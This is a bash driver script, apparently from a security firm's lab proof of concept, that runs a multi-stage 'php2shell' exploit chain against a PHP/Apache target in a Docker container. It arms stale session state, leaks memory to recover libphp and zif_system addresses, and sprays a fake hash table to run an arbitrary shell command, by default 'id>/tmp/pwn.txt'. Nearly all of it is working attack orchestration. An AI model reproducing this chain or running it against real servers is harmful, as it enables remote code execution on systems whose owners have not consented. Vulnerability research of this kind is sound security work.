#!/bin/bash
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

# chain.sh - the whole php2shell chain with our own tools, one target, one proof file.
#
#   chain.sh --target http://127.0.0.1:18110/index.php --container p2s-target
#
# Steps: A1 arms the stale session id, B1 discloses 800 KB out of the recycled chunk, leak_addrs
# turns that into libphp/main/S/hsv, A2 re-arms with the cheap OOM, B2 sprays the fake reference and
# the fake array. The proof is a command run by the target's user, written through the container.
#
# Exit codes: 0 chain verified and the proof file was read
#             2 preflight refused the target, or a step failed
#             5 preflight says the build arms but cannot disclose (8.5.11)
#             6 --allow-arming-only: the gate passed and the run stopped there on purpose
set -u

TARGET="http://127.0.0.1:18110/index.php"
CONTAINER="${CONTAINER:-${NAME:-p2s-target}}"
CMD='id>/tmp/pwn.txt'
PROOF="/tmp/pwn.txt"
SPEC="G:511:0x137*14,G:400:0x137,X:900"
PARTS=880
DEPTH=64
FILLERS=115
WORKERS=0          # >1: hold WORKERS-1 connections so every step lands on the same child
SYMBOLS=""         # empty = resolve from the image's own symbol table (portable across builds/arches)
PROBE=""           # path of a deployed probe.php, an input to the preflight
SKIP_PREFLIGHT=0
ALLOW_UNVERIFIED=0 # gate: continue when A1 died but no container log is available
ALLOW_ARMING_ONLY=0 # preflight: accept an arming-only build (8.5.11) and stop after the gate
STOP_AFTER_GATE=0   # implied by --allow-arming-only

while [ $# -gt 0 ]; do
  case "$1" in
    --target) TARGET="$2"; shift 2 ;;
    --container) CONTAINER="$2"; shift 2 ;;
    --cmd) CMD="$2"; shift 2 ;;
    --proof) PROOF="$2"; shift 2 ;;
    --parts) PARTS="$2"; shift 2 ;;
    --depth) DEPTH="$2"; shift 2 ;;
    --fillers) FILLERS="$2"; shift 2 ;;
    --workers) WORKERS="$2"; shift 2 ;;
    --symbols) SYMBOLS="$2"; shift 2 ;;
    --probe) PROBE="$2"; shift 2 ;;
    --skip-preflight) SKIP_PREFLIGHT=1; shift ;;
    --allow-unverified) ALLOW_UNVERIFIED=1; shift ;;
    --allow-arming-only) ALLOW_ARMING_ONLY=1; STOP_AFTER_GATE=1; shift ;;
    *) echo "unknown argument $1" >&2; exit 2 ;;
  esac
done

HERE="$(cd "$(dirname "$0")" && pwd)"
COOKIE=$(mktemp)
A1OUT=""
HOLDER=""


# Fail before the first stage rather than after it: four requests against nothing produce four
# confusing errors, and the interesting one is always the first.
python3 -c '
import socket, sys
url = sys.argv[1].split("://", 1)[-1].split("/", 1)[0]
host, _, port = url.partition(":")
try:
    socket.create_connection((host, int(port or 80)), timeout=3).close()
except OSError as exc:
    sys.exit("no target on %s (%s)" % (url, exc.strerror or exc))
' "$TARGET" || exit 1

# Answer the cheap compatibility questions before spending the body: the chain is tied to one build
# family and one SAPI, and anything else fails in the middle in a way that reads like a broken exploit.
if [ "$SKIP_PREFLIGHT" = 1 ]; then
  echo "preflight: skipped"
else
  PF_ARGS=(--url "$TARGET")
  [ -n "$PROBE" ] && PF_ARGS+=(--probe "$PROBE")
  [ "$ALLOW_ARMING_ONLY" = 1 ] && PF_ARGS+=(--allow-arming-only)
  python3 "$HERE/preflight.py" "${PF_ARGS[@]}"
  PF_RC=$?
  if [ "$PF_RC" = 5 ]; then
    # Arming reproduces here, disclosure does not, so a chain run can only fail at B1. That is worth
    # knowing on purpose -- it is how the arming instrument is validated -- but not by accident.
    echo "[!] this build arms but cannot disclose: B1 has nothing to leak" >&2
    echo "    re-run with --allow-arming-only to verify the arming instrument and stop after the gate," >&2
    echo "    or with --skip-preflight to try the whole chain anyway" >&2
    exit 5
  elif [ "$PF_RC" != 0 ]; then
    echo "[!] preflight failed - re-run with --skip-preflight to try anyway" >&2
    exit 2
  fi
fi

# Every offset in this chain is a property of one binary, so nothing here is hardcoded: the symbols are
# read out of the image that is actually running (zif_system is not exported, so the full symbol table is
# used). That is what makes the same command work on arm64 and on x86-64 without an --arch flag.
if [ -z "$SYMBOLS" ]; then
  SYMBOLS=$(docker exec "$CONTAINER" sh -c \
    'M=/usr/lib/apache2/modules/libphp.so; [ -f "$M" ] || M=/usr/local/lib/libphp.so; nm "$M" 2>/dev/null' \
    2>/dev/null | awk '
      $3 == "zval_ptr_dtor"     { a = $1 }
      $3 == "zif_system"        { b = $1 }
      $3 == "zend_hash_destroy" { c = $1 }
      END {
        s = ""; n = 0
        if (a) { s = s (n++ ? "," : "") "zval_ptr_dtor=0x" a }
        if (b) { s = s (n++ ? "," : "") "zif_system=0x" b }
        if (c) { s = s (n++ ? "," : "") "zend_hash_destroy=0x" c }
        print s
      }')
fi
if [ -z "$SYMBOLS" ]; then
  echo "warning: could not read symbols from $CONTAINER; falling back to the arm64 8.4.26 offsets" >&2
  echo "         (pass --symbols name=0xoff,... for any other arch or build)" >&2
fi
SYM_ARGS=()
if [ -n "$SYMBOLS" ]; then
  _old_ifs="$IFS"; IFS=','
  for _pair in $SYMBOLS; do
    SYM_ARGS+=(--symbol "$_pair")
  done
  IFS="$_old_ifs"
fi
echo "symbols: ${SYMBOLS:-<arm64 defaults>}"

cleanup() {
  rm -f "$COOKIE" "$A1OUT"
  if [ -n "$HOLDER" ]; then
    kill "$HOLDER" 2>/dev/null
    wait "$HOLDER" 2>/dev/null
  fi
}
trap cleanup EXIT

if [ "$WORKERS" -gt 1 ]; then
  python3 "$HERE/hold_workers.py" --url "$TARGET" --count "$((WORKERS - 1))" --hold 180 &
  HOLDER=$!
  sleep 3
fi

# A1 output is kept in a file: the gate needs the whole thing (status, OOM text, socket outcome), not
# a two-line preview. The log timestamp slices the container log to this run so an older OOM line
# cannot be mistaken for this one.
A1OUT=$(mktemp)
A1SINCE=$(date -u +%Y-%m-%dT%H:%M:%SZ)
python3 "$HERE/a1_arm.py" --url "$TARGET" --repeat 1 --sid-hex 00 --big 78 \
        --query-n 5 --query-len 1 --timeout 120 > "$A1OUT"
grep -E '^  attempt |socket:|tried to allocate' "$A1OUT" | head -3

GATE_ARGS=(--a1-output "$A1OUT" --since "$A1SINCE")
[ -n "$CONTAINER" ] && GATE_ARGS+=(--container "$CONTAINER")
[ "$ALLOW_UNVERIFIED" = 1 ] && GATE_ARGS+=(--allow-unverified)
python3 "$HERE/arming_gate.py" "${GATE_ARGS[@]}" || exit $?

if [ "$STOP_AFTER_GATE" = 1 ]; then
  echo
  echo "stopping after the gate: this build is expected to arm and not to disclose."
  echo "The arming instrument is verified; B1, A2 and B2 were not attempted."
  echo "exit 6 means 'as expected for this build', not 'the chain worked'."
  exit 6
fi
sleep 1

python3 "$HERE/b1_forge.py" --url "$TARGET" --spec "$SPEC" --fake-len 0xC8000 \
        --sid a --progress-first --chunked --save-cookie "$COOKIE" \
        | grep -E 'response|Set-Cookie' || exit 1

ADDRS=$(python3 "$HERE/leak_addrs.py" --cookie-file "$COOKIE" "${SYM_ARGS[@]}" --emit shell) || exit 1
eval "$ADDRS"
echo "leak: libphp=$LIBPHP main=$MAIN S=$S hsv=$HSV zif=$ZIF_SYSTEM"
sleep 1

python3 "$HERE/a2_cheap_oom.py" --url "$TARGET" --parts "$PARTS" --depth "$DEPTH" \
        --fillers "$FILLERS"
sleep 1

HT=$(mktemp)
python3 "$HERE/mk_fake_ht.py" --ht "$S" --zif "$ZIF_SYSTEM" --cmd "$CMD" --out "$HT"
B2OUT=$(python3 "$HERE/b2_exec.py" --url "$TARGET" --ht-addr "$S" --ht-file "$HT" --vl 384 \
        --n1 500 --n2 495 --rc 1)
echo "$B2OUT"
rm -f "$HT"
# A successful fire ends with the worker dead, so the client sees the connection drop ("response=0"). An
# answered request means B2 landed on a child that never held the stale state - the usual cause is a pool
# bigger than the number of workers we pinned.
case "$B2OUT" in
  *"response=0"*) ;;
  *) echo "[!] B2 was answered instead of dropping the connection: this request did not reach the child" >&2
     echo "    that held the stale session state. With more than one worker that is a pinning race -" >&2
     echo "    re-run, or use the single-worker target (lab/start_target.sh --single)." >&2 ;;
esac
sleep 2

echo "proof:"
# With a single Apache child the crash that ends the chain takes the container down, and then
# `docker exec` cannot reach the file - `docker cp` can, because it works on a stopped container.
docker exec "$CONTAINER" sh -c "cat $PROOF 2>/dev/null || echo '(no file)'" 2>/dev/null \
  || docker cp "$CONTAINER:$PROOF" /dev/stdout 2>/dev/null \
  || echo "(container $CONTAINER is gone and held no proof file)"
